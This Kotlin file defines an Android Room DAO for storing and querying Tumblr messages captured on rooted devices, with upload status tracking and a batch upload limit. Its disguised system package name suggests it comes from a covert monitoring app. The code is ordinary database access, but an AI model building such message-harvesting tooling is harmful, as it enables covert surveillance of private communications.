package com.android.services.db.dao

import androidx.room.Dao
import androidx.room.Insert
import androidx.room.OnConflictStrategy
import androidx.room.Query
import com.android.services.db.entities.TumblrMessageRooted
import com.android.services.util.AppConstants
import java.util.*

@Dao
interface TumblrMessageRootedDao {

    @Insert(onConflict = OnConflictStrategy.IGNORE)
    fun insert(tumblr_message: List<TumblrMessageRooted>)

    @Query("Select * from tumblr_message_rooted where status =:status ORDER BY date DESC limit ${AppConstants.imLogsUploadLimit}")
    fun selectAllTumblrMessageRootedMessages(status: Int): List<TumblrMessageRooted>

    @Query("Update tumblr_message_rooted set status=:updated_status where date BETWEEN :startDate AND :endDate")
    fun update(updated_status: Int, startDate: Date, endDate: Date): Int

    @Query("select max(timeStamp) from tumblr_message_rooted")
    fun selectMaxTimeStamp(): Long?
}